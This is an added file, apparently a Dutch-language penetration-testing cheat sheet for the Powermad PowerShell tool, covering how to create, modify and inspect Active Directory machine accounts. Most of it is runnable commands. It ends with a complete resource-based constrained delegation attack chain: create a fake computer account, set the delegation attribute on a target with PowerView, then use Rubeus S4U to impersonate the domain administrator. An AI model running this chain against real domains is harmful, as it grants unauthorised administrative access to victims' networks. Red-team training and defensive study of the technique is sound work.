@@ -1,0 +1,48 @@
+# PowerMad — Machine account manipulatie voor AD aanvallen
+# Maak en beheer machine accounts in AD, essentieel voor RBCD en andere delegatie aanvallen
+#
+# === Laden ===
+# . .\Powermad.ps1
+# Import-Module .\Powermad.ps1
+#
+# === Functies ===
+# New-MachineAccount          Maak nieuw machine account aan
+# Set-MachineAccountAttribute Wijzig machine account attributen
+# Get-MachineAccountCreator   Toon wie machine accounts heeft aangemaakt
+# Disable-MachineAccount      Schakel machine account uit
+# Get-MachineAccountAttribute Lees machine account attributen
+#
+# === Belangrijkste opties ===
+# -MachineAccount NAME    Naam van het machine account
+# -Password SECURE        SecureString wachtwoord
+# -Domain DOMAIN          Doeldomein
+# -DomainController DC    Specifieke DC
+# -Credential $cred       PSCredential object
+#
+# === Vereisten ===
+# - MachineAccountQuota > 0 (standaard 10 in AD)
+# - Controleer: Get-DomainObject -Identity "DC=DOMAIN,DC=LOCAL" -Properties ms-DS-MachineAccountQuota
+#
+# === Voorbeelden ===
+# -- Machine account aanmaken --
+New-MachineAccount -MachineAccount FAKEPC -Password $(ConvertTo-SecureString 'Wachtwoord123!' -AsPlainText -Force)
+# -- Met specifiek domein en DC --
+New-MachineAccount -MachineAccount FAKEPC -Password $(ConvertTo-SecureString 'PASS' -AsPlainText -Force) -Domain DOMAIN -DomainController DC
+# -- Machine account attributen bekijken --
+Get-MachineAccountAttribute -MachineAccount FAKEPC -Attribute servicePrincipalName
+# -- Machine account attributen wijzigen --
+Set-MachineAccountAttribute -MachineAccount FAKEPC -Attribute ServicePrincipalName -Value "cifs/fake.DOMAIN" -Append
+# -- Machine account uitschakelen --
+Disable-MachineAccount -MachineAccount FAKEPC
+# -- Wie heeft machine accounts aangemaakt --
+Get-MachineAccountCreator
+# -- RBCD aanvalsketen compleet --
+# 1. Machine account maken:
+New-MachineAccount -MachineAccount FAKEPC -Password $(ConvertTo-SecureString 'PASS' -AsPlainText -Force)
+# 2. RBCD instellen (via PowerView):
+# $sid = Get-DomainComputer FAKEPC -Properties objectsid | Select -Expand objectsid
+# $sd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
+# Set-DomainObject TARGET -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sd_bytes}
+# 3. S4U via Rubeus:
+# Rubeus.exe hash /password:PASS /user:FAKEPC$ /domain:DOMAIN
+# Rubeus.exe s4u /user:FAKEPC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/TARGET /nowrap
